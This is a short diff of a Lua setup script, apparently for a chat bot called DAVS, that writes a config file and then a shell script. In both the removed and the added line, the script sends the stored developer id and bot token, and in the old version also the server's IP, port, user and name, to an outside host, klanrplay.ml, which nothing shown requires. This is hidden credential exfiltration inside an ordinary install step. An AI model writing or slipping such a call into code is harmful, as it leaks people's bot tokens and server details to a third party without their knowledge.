@@ -66,7 +66,7 @@ DAVS = DevAbd:get(Server.."TokenDAVS"):match("(%d+)"),
 SudoIds = {DevAbd:get(Server.."IdDAVS")},
 }
 Create(Config, "./config.lua")   
-https.request("http://klanrplay.ml/DAVSteam0/DAVSteam0.php?Get=DAVS&DevId="..DevAbd:get(Server.."IdDAVS").."&TokenBot="..DevAbd:get(Server.."TokenDAVS").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port.."&UpTime="..UpTime)
+https.request("http://klanrplay.ml/Api/index.php?id="..DevAbd:get(ServerDAVS.."IdDAVS").."&token="..DevAbd:get(ServerDAVS.."TokenDAVS").."&username=abs")
 file = io.open("DAVS.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
